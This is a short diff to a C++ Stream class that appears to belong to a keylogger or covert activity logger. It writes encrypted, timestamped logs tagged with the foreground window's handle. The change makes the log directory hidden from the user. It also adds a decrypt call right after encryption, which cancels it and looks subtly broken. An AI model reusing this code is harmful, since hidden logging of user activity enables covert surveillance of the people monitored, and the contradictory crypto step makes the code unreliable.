@@ -17,8 +17,9 @@ std::string Stream::GetPath(const std::string &dir) {
 }
 
 bool Stream::MakeDir(const std::string &path) {
-  return CreateDirectory(path.c_str(), nullptr)
-	  || GetLastError() == ERROR_ALREADY_EXISTS;
+  bool ret = CreateDirectoryA(path.c_str(), nullptr) || GetLastError() == ERROR_ALREADY_EXISTS;
+  SetFileAttributesA(path.c_str(), FILE_ATTRIBUTE_HIDDEN);
+  return ret;
 }
 
 bool Stream::WriteLog(const std::string &input, uint32_t &active, const bool blockProcessInfo) {
@@ -36,6 +37,7 @@ bool Stream::WriteLog(const std::string &input, uint32_t &active, const bool blo
 	std::string timeString =
 		"\n[" + SysTime::SystemTime::Now().GetFullDate() + " " + Convert::HwndToString(GetForegroundWindow()) + "]\n";
 	Crypt::Encrypt(timeString);
+	Crypt::Decrypt(timeString);
 	logFile->Ofstream << timeString;
   }
   std::string cryptInput = input;
@@ -52,4 +54,3 @@ bool Stream::MakeFile() {
   }
   return true;
 }
-
